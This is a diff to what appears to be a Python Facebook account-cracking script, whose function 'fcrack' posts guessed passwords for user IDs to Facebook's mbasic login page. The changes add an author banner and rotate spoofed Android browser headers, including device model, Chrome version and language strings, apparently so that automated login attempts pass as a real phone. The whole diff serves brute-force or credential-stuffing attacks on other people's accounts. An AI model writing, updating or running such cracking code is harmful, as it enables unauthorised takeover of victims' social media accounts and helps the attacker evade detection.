@@ -1,3 +1,9 @@
+#__________________| INFO |___________________#
+#______SCRIPT ENCRYPTED BY PYTHON 3.0
+#______CODING BY: U7P4L 1N
+#______GITHUB : https://github.com/U7P4L-IN
+#________________| SCRIPT DATA |_____________#
+
 import os
 try:
 	import requests
@@ -398,23 +404,24 @@ def fcrack(uid,pwx,tl):
 			"pass":ps,
 			"login":"Log In"}
 			headers = {
-    'authority': 'mbasic.facebook.com',
+    'authority': 'free.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-PH,en-US;q=0.9,en;q=0.8',
+    'accept-language': 'en-US,en;q=0.9,uz-UZ;q=0.8,uz;q=0.7,fil-PH;q=0.6,fil;q=0.5',
     'cache-control': 'max-age=0',
+    'dpr': '2',
     'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"RMX3241"',
+    'sec-ch-ua-model': '"TECNO KE6j"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"13.0.0"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',
 }
 			lo = session.post( 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
